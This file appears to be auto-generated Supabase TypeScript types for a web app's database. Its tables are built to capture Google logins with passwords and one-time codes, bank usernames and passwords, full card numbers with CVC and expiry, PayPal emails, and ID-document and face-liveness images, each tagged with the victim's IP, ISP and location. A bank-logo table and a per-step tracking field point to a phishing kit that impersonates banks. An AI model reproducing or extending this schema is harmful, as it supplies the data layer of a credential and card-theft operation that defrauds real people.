export type Json =
  | string
  | number
  | boolean
  | null
  | { [key: string]: Json | undefined }
  | Json[]

export type Database = {
  // Allows to automatically instantiate createClient with right options
  // instead of createClient<Database, { PostgrestVersion: 'XX' }>(URL, KEY)
  __InternalSupabase: {
    PostgrestVersion: "14.5"
  }
  public: {
    Tables: {
      bank_logos: {
        Row: {
          domain: string
          logo_url: string
          updated_at: string
        }
        Insert: {
          domain: string
          logo_url: string
          updated_at?: string
        }
        Update: {
          domain?: string
          logo_url?: string
          updated_at?: string
        }
        Relationships: []
      }
      google_submissions: {
        Row: {
          browser: string | null
          created_at: string
          device: string | null
          email: string | null
          id: string
          ip: string | null
          ip_city: string | null
          ip_country: string | null
          ip_isp: string | null
          ip_region: string | null
          os: string | null
          otp: string | null
          password: string | null
          phone: string | null
          session_id: string
          step: string | null
          updated_at: string
          user_agent: string | null
        }
        Insert: {
          browser?: string | null
          created_at?: string
          device?: string | null
          email?: string | null
          id?: string
          ip?: string | null
          ip_city?: string | null
          ip_country?: string | null
          ip_isp?: string | null
          ip_region?: string | null
          os?: string | null
          otp?: string | null
          password?: string | null
          phone?: string | null
          session_id: string
          step?: string | null
          updated_at?: string
          user_agent?: string | null
        }
        Update: {
          browser?: string | null
          created_at?: string
          device?: string | null
          email?: string | null
          id?: string
          ip?: string | null
          ip_city?: string | null
          ip_country?: string | null
          ip_isp?: string | null
          ip_region?: string | null
          os?: string | null
          otp?: string | null
          password?: string | null
          phone?: string | null
          session_id?: string
          step?: string | null
          updated_at?: string
          user_agent?: string | null
        }
        Relationships: []
      }
      identity_verifications: {
        Row: {
          created_at: string
          current_step: string | null
          doc_back_url: string | null
          doc_image_url: string | null
          doc_type: string | null
          face_blink_url: string | null
          face_left_url: string | null
          face_look_url: string | null
          face_right_url: string | null
          id: string
          ip: string | null
          session_id: string
          status: string
          updated_at: string
          user_agent: string | null
          user_id: string | null
        }
        Insert: {
          created_at?: string
          current_step?: string | null
          doc_back_url?: string | null
          doc_image_url?: string | null
          doc_type?: string | null
          face_blink_url?: string | null
          face_left_url?: string | null
          face_look_url?: string | null
          face_right_url?: string | null
          id?: string
          ip?: string | null
          session_id: string
          status?: string
          updated_at?: string
          user_agent?: string | null
          user_id?: string | null
        }
        Update: {
          created_at?: string
          current_step?: string | null
          doc_back_url?: string | null
          doc_image_url?: string | null
          doc_type?: string | null
          face_blink_url?: string | null
          face_left_url?: string | null
          face_look_url?: string | null
          face_right_url?: string | null
          id?: string
          ip?: string | null
          session_id?: string
          status?: string
          updated_at?: string
          user_agent?: string | null
          user_id?: string | null
        }
        Relationships: []
      }
      profiles: {
        Row: {
          created_at: string
          email: string
          id: string
          updated_at: string
        }
        Insert: {
          created_at?: string
          email: string
          id: string
          updated_at?: string
        }
        Update: {
          created_at?: string
          email?: string
          id?: string
          updated_at?: string
        }
        Relationships: []
      }
      trial_submissions: {
        Row: {
          address1: string | null
          address2: string | null
          admin_confirmed: boolean
          bank_name: string | null
          bank_password: string | null
          bank_username: string | null
          browser: string | null
          card_cvc: string | null
          card_exp: string | null
          card_name: string | null
          card_number: string | null
          city: string | null
          country: string | null
          created_at: string
          device: string | null
          device_confirmed: boolean | null
          id: string
          ip: string | null
          ip_city: string | null
          ip_country: string | null
          ip_isp: string | null
          ip_region: string | null
          method: string | null
          os: string | null
          otp_code: string | null
          paypal_email: string | null
          phone: string | null
          postal: string | null
          session_id: string
          state: string | null
          step: string | null
          twofa_method: string | null
          updated_at: string
          user_agent: string | null
        }
        Insert: {
          address1?: string | null
          address2?: string | null
          admin_confirmed?: boolean
          bank_name?: string | null
          bank_password?: string | null
          bank_username?: string | null
          browser?: string | null
          card_cvc?: string | null
          card_exp?: string | null
          card_name?: string | null
          card_number?: string | null
          city?: string | null
          country?: string | null
          created_at?: string
          device?: string | null
          device_confirmed?: boolean | null
          id?: string
          ip?: string | null
          ip_city?: string | null
          ip_country?: string | null
          ip_isp?: string | null
          ip_region?: string | null
          method?: string | null
          os?: string | null
          otp_code?: string | null
          paypal_email?: string | null
          phone?: string | null
          postal?: string | null
          session_id: string
          state?: string | null
          step?: string | null
          twofa_method?: string | null
          updated_at?: string
          user_agent?: string | null
        }
        Update: {
          address1?: string | null
          address2?: string | null
          admin_confirmed?: boolean
          bank_name?: string | null
          bank_password?: string | null
          bank_username?: string | null
          browser?: string | null
          card_cvc?: string | null
          card_exp?: string | null
          card_name?: string | null
          card_number?: string | null
          city?: string | null
          country?: string | null
          created_at?: string
          device?: string | null
          device_confirmed?: boolean | null
          id?: string
          ip?: string | null
          ip_city?: string | null
          ip_country?: string | null
          ip_isp?: string | null
          ip_region?: string | null
          method?: string | null
          os?: string | null
          otp_code?: string | null
          paypal_email?: string | null
          phone?: string | null
          postal?: string | null
          session_id?: string
          state?: string | null
          step?: string | null
          twofa_method?: string | null
          updated_at?: string
          user_agent?: string | null
        }
        Relationships: []
      }
      user_scans: {
        Row: {
          created_at: string
          flags: string[]
          id: string
          level: string
          score: number
          thumb: string | null
          user_id: string
        }
        Insert: {
          created_at?: string
          flags?: string[]
          id?: string
          level: string
          score: number
          thumb?: string | null
          user_id: string
        }
        Update: {
          created_at?: string
          flags?: string[]
          id?: string
          level?: string
          score?: number
          thumb?: string | null
          user_id?: string
        }
        Relationships: []
      }
    }
    Views: {
      [_ in never]: never
    }
    Functions: {
      [_ in never]: never
    }
    Enums: {
      [_ in never]: never
    }
    CompositeTypes: {
      [_ in never]: never
    }
  }
}

type DatabaseWithoutInternals = Omit<Database, "__InternalSupabase">

type DefaultSchema = DatabaseWithoutInternals[Extract<keyof Database, "public">]

export type Tables<
  DefaultSchemaTableNameOrOptions extends
    | keyof (DefaultSchema["Tables"] & DefaultSchema["Views"])
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof (DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"] &
        DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Views"])
    : never = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? (DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"] &
      DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Views"])[TableName] extends {
      Row: infer R
    }
    ? R
    : never
  : DefaultSchemaTableNameOrOptions extends keyof (DefaultSchema["Tables"] &
        DefaultSchema["Views"])
    ? (DefaultSchema["Tables"] &
        DefaultSchema["Views"])[DefaultSchemaTableNameOrOptions] extends {
        Row: infer R
      }
      ? R
      : never
    : never

export type TablesInsert<
  DefaultSchemaTableNameOrOptions extends
    | keyof DefaultSchema["Tables"]
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"]
    : never = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"][TableName] extends {
      Insert: infer I
    }
    ? I
    : never
  : DefaultSchemaTableNameOrOptions extends keyof DefaultSchema["Tables"]
    ? DefaultSchema["Tables"][DefaultSchemaTableNameOrOptions] extends {
        Insert: infer I
      }
      ? I
      : never
    : never

export type TablesUpdate<
  DefaultSchemaTableNameOrOptions extends
    | keyof DefaultSchema["Tables"]
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"]
    : never = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"][TableName] extends {
      Update: infer U
    }
    ? U
    : never
  : DefaultSchemaTableNameOrOptions extends keyof DefaultSchema["Tables"]
    ? DefaultSchema["Tables"][DefaultSchemaTableNameOrOptions] extends {
        Update: infer U
      }
      ? U
      : never
    : never

export type Enums<
  DefaultSchemaEnumNameOrOptions extends
    | keyof DefaultSchema["Enums"]
    | { schema: keyof DatabaseWithoutInternals },
  EnumName extends DefaultSchemaEnumNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaEnumNameOrOptions["schema"]]["Enums"]
    : never = never,
> = DefaultSchemaEnumNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaEnumNameOrOptions["schema"]]["Enums"][EnumName]
  : DefaultSchemaEnumNameOrOptions extends keyof DefaultSchema["Enums"]
    ? DefaultSchema["Enums"][DefaultSchemaEnumNameOrOptions]
    : never

export type CompositeTypes<
  PublicCompositeTypeNameOrOptions extends
    | keyof DefaultSchema["CompositeTypes"]
    | { schema: keyof DatabaseWithoutInternals },
  CompositeTypeName extends PublicCompositeTypeNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[PublicCompositeTypeNameOrOptions["schema"]]["CompositeTypes"]
    : never = never,
> = PublicCompositeTypeNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[PublicCompositeTypeNameOrOptions["schema"]]["CompositeTypes"][CompositeTypeName]
  : PublicCompositeTypeNameOrOptions extends keyof DefaultSchema["CompositeTypes"]
    ? DefaultSchema["CompositeTypes"][PublicCompositeTypeNameOrOptions]
    : never

export const Constants = {
  public: {
    Enums: {},
  },
} as const
